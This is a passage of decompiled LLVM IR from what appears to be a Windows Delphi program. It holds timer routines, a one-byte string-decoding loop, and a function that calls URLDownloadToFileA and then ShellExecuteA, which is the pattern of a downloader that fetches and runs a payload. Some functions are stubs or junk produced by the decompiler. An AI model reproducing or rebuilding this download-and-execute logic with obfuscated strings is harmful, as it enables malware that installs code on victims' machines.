dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1347
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1347
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1347
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1348
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1349
  %3 = add i32 %2, 1, !insn.addr !1349
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1349
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1350
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1351
  ret i32 0, !insn.addr !1352
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1353
  ret i32 %0, !insn.addr !1353
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1354
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1355
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1356
  %2 = add i32 %1, -1, !insn.addr !1356
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1356
  ret i32 %0, !insn.addr !1357
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1358
  %0 = call i32 @function_40603c(), !insn.addr !1359
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1360
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1361
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1361

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1362
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1363
  %5 = load i32, i32* %4, align 4, !insn.addr !1363
  %6 = icmp eq i32 %5, 0, !insn.addr !1363
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1364
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1364

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1365
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1366
  unreachable, !insn.addr !1366

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1367
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1368
  %1 = icmp eq i32 %0, 0, !insn.addr !1368
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1369

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1370
  br label %dec_label_pc_40601a, !insn.addr !1370

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1371
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1372
  %5 = load i32, i32* %4, align 4, !insn.addr !1372
  %6 = mul i32 %5, 1000, !insn.addr !1372
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1373
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1374
  ret i32 %7, !insn.addr !1375
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1376
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1376
  %1 = icmp eq i32 %0, 0, !insn.addr !1376
  store i32 %0, i32* %.reg2mem, !insn.addr !1377
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1377

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1377
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1377
  br label %dec_label_pc_406045, !insn.addr !1377

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1378
  ret i32 %.reload, !insn.addr !1379
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1380
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1381
  ret i32 %1, !insn.addr !1382
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1383
  %1 = icmp eq i32 %0, 0, !insn.addr !1383
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1384

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1385
  br label %dec_label_pc_406076, !insn.addr !1385

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1386
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1387
  ret i32 %3, !insn.addr !1388
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1389
  ret i32 %0, !insn.addr !1390
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1391
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1391
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1391
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1392
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1393
  %3 = add i32 %2, 1, !insn.addr !1393
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1393
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1394
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1395
  ret i32 0, !insn.addr !1396
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1397
  ret i32 %0, !insn.addr !1397
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1398
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1399
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1400
  %2 = add i32 %1, -1, !insn.addr !1400
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1400
  ret i32 %0, !insn.addr !1401
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1402
  ret i32 %0, !insn.addr !1402
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1403
  %ebx.0.reg2mem = alloca i32, !insn.addr !1403
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1404
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1405
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1405
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1405
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1406
  %4 = call i32 @function_4034c8(), !insn.addr !1407
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1408
  %6 = call i32 @function_4034c8(), !insn.addr !1409
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1410
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1410
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1410

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1411
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1411
  %11 = load i8, i8* %10, align 1, !insn.addr !1411
  %12 = icmp eq i8 %11, 61, !insn.addr !1411
  %13 = icmp eq i1 %12, false, !insn.addr !1412
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1412

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1413
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1413
  store i8 46, i8* %16, align 1, !insn.addr !1413
  br label %dec_label_pc_406162, !insn.addr !1414

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1415
  %18 = add i8 %17, -1, !insn.addr !1416
  %19 = add i32 %14, %8, !insn.addr !1417
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1417
  store i8 %18, i8* %20, align 1, !insn.addr !1417
  br label %dec_label_pc_406162, !insn.addr !1417

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1418
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1419
  %23 = icmp eq i32 %22, 0, !insn.addr !1419
  %24 = icmp eq i1 %23, false, !insn.addr !1420
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1420
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1420
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1420

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1421
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1422
  %26 = call i32 @"@LStrClr"(), !insn.addr !1423
  ret i32 %26, !insn.addr !1424
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1425
  ret i32 %0, !insn.addr !1425
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1426
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1427
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1428
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1429
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1430
  ret i32 %4, !insn.addr !1431
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1432
  %esp.0.reg2mem = alloca i32, !insn.addr !1432
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1432
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1433
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1433
  br label %dec_label_pc_4061cc, !insn.addr !1433

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1434
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1434
  store i32 0, i32* %2, align 4, !insn.addr !1434
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1435
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1435
  store i32 0, i32* %4, align 4, !insn.addr !1435
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1436
  %6 = icmp eq i32 %5, 0, !insn.addr !1436
  %7 = icmp eq i1 %6, false, !insn.addr !1437
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1437
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1437
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1437

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1438
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1438
  store i32 0, i32* %9, align 4, !insn.addr !1438
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1439
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1439
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1440
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1440
  store i32 %0, i32* %13, align 4, !insn.addr !1440
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1441
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1441
  store i32 4219659, i32* %15, align 4, !insn.addr !1441
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1442
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1442
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1442
  store i32 %16, i32* %18, align 4, !insn.addr !1442
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1443
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1444
  %20 = call i32 @function_4060f0(), !insn.addr !1445
  %21 = call i32 @function_4036c8(), !insn.addr !1446
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1447
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1448
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1448
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1448
  store i32 %25, i32* %24, align 4, !insn.addr !1448
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1449
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1450
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1451
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1451
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1451
  store i32 %30, i32* %29, align 4, !insn.addr !1451
  %31 = call i32 @function_4034c8(), !insn.addr !1452
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1453
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1454
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1454
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1454
  %35 = call i32 @function_40618c(), !insn.addr !1455
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1456
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1456
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1457
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1457
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1457
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1458
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1458
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1458
  store i32 %40, i32* %42, align 4, !insn.addr !1458
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1459
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1460
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1460
  store i32 0, i32* %45, align 4, !insn.addr !1460
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1461
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1461
  store i32 0, i32* %47, align 4, !insn.addr !1461
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1462
  %49 = call i32 @function_4036c8(), !insn.addr !1463
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1464
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1464
  store i32 %49, i32* %51, align 4, !insn.addr !1464
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1465
  %53 = call i32 @function_4060f0(), !insn.addr !1466
  %54 = call i32 @function_4036c8(), !insn.addr !1467
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1468
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1468
  store i32 %54, i32* %56, align 4, !insn.addr !1468
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1469
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1469
  store i32 0, i32* %58, align 4, !insn.addr !1469
  %59 = call i32 @function_4060e8(), !insn.addr !1470
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1471
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1471
  store i32 1, i32* %61, align 4, !insn.addr !1471
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1472
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1472
  store i32 0, i32* %63, align 4, !insn.addr !1472
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1473
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1473
  store i32 0, i32* %65, align 4, !insn.addr !1473
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1474
  %67 = call i32 @function_4036c8(), !insn.addr !1475
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1476
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1476
  store i32 %67, i32* %69, align 4, !insn.addr !1476
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1477
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1477
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1477
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1478
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1478
  store i32 0, i32* %73, align 4, !insn.addr !1478
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1479
  %75 = load i32, i32* %73, align 4, !insn.addr !1480
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1481
  store i32 4219666, i32* %69, align 4, !insn.addr !1482
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1483
  ret i32 %76, !insn.addr !1484
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1485
  ret i32 %0, !insn.addr !1485
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1486
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1487
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1488
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1488
  %ecx.0.reg2mem = alloca i32, !insn.addr !1488
  %esp.0.reg2mem = alloca i32, !insn.addr !1488
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1488
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1488
  store i32 %5, i32* %6, align 4, !insn.addr !1488
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1489
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1489
  %11 = add i8 %8, %10, !insn.addr !1489
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1489
  store i8 %11, i8* %12, align 1, !insn.addr !1489
  %13 = add i32 %2, 58, !insn.addr !1490
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1490
  %15 = load i8, i8* %14, align 1, !insn.addr !1490
  %16 = load i32, i32* %eax, align 4, !insn.addr !1490
  %17 = udiv i32 %16, 256, !insn.addr !1490
  %18 = trunc i32 %17 to i8, !insn.addr !1490
  %19 = add i8 %15, %18, !insn.addr !1490
  store i8 %19, i8* %14, align 1, !insn.addr !1490
  %20 = add i32 %0, 112, !insn.addr !1491
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1491
  %22 = load i8, i8* %21, align 1, !insn.addr !1491
  %23 = trunc i32 %4 to i8, !insn.addr !1491
  %24 = add i8 %22, %23, !insn.addr !1491
  store i8 %24, i8* %21, align 1, !insn.addr !1491
  %25 = trunc i32 %3 to i16, !insn.addr !1492
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1492
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1492
  %27 = load i8, i8* %7, align 4, !insn.addr !1493
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1493
  %30 = add i8 %27, %29, !insn.addr !1493
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1493
  store i8 %30, i8* %31, align 1, !insn.addr !1493
  %32 = load i8, i8* %7, align 4, !insn.addr !1494
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1494
  %35 = add i8 %32, %34, !insn.addr !1494
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1494
  store i8 %35, i8* %36, align 1, !insn.addr !1494
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1495
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1496
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1496
  br label %dec_label_pc_406350, !insn.addr !1496

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1497
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1497
  store i32 0, i32* %39, align 4, !insn.addr !1497
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1498
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1498
  store i32 0, i32* %41, align 4, !insn.addr !1498
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1499
  %43 = icmp eq i32 %42, 0, !insn.addr !1499
  %44 = icmp eq i1 %43, false, !insn.addr !1500
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1500
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1500
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1500

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1501
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1501
  store i32 0, i32* %46, align 4, !insn.addr !1501
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1502
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1502
  store i32 %37, i32* %48, align 4, !insn.addr !1502
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1503
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1503
  store i32 4220396, i32* %50, align 4, !insn.addr !1503
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1504
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1504
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1504
  store i32 %51, i32* %53, align 4, !insn.addr !1504
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1505
  %54 = call i32 @"@LStrPos"(), !insn.addr !1506
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1507
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1507
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1507
  store i32 %57, i32* %56, align 4, !insn.addr !1507
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1508
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1509
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1509
  store i32 %61, i32* %60, align 4, !insn.addr !1509
  %62 = call i32 @function_4034c8(), !insn.addr !1510
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1511
  %64 = add i32 %arg1, -1, !insn.addr !1512
  store i32 %64, i32* %eax, align 4, !insn.addr !1512
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4065d1 [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406509
    i32 2, label %dec_label_pc_406577
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1513
  %66 = icmp slt i32 %65, 5, !insn.addr !1514
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1514
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1514
  br i1 %66, label %dec_label_pc_4065d1, label %dec_label_pc_4063da, !insn.addr !1514

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1515
  %68 = call i32 @function_4060f0(), !insn.addr !1516
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1517
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1517
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1518
  %72 = call i32 @function_4060f0(), !insn.addr !1519
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1520
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1520
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1521
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1521
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1521
  store i32 %75, i32* %77, align 4, !insn.addr !1521
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1522
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1522
  store i32 ptrtoint (i32* @global_var_406610 to i32), i32* %79, align 4, !insn.addr !1522
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1523
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1523
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1523
  store i32 %80, i32* %82, align 4, !insn.addr !1523
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1524
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1525
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1525
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1526
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1526
  store i32 4220444, i32* %87, align 4, !insn.addr !1526
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1527
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1527
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1527
  store i32 %88, i32* %90, align 4, !insn.addr !1527
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1528
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1528
  store i32 4220460, i32* %92, align 4, !insn.addr !1528
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1529
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1529
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1529
  store i32 %93, i32* %95, align 4, !insn.addr !1529
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1530
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1530
  store i32 4220476, i32* %97, align 4, !insn.addr !1530
  %98 = call i32 @function_407494(), !insn.addr !1531
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1532
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1532
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1533
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1534
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1534
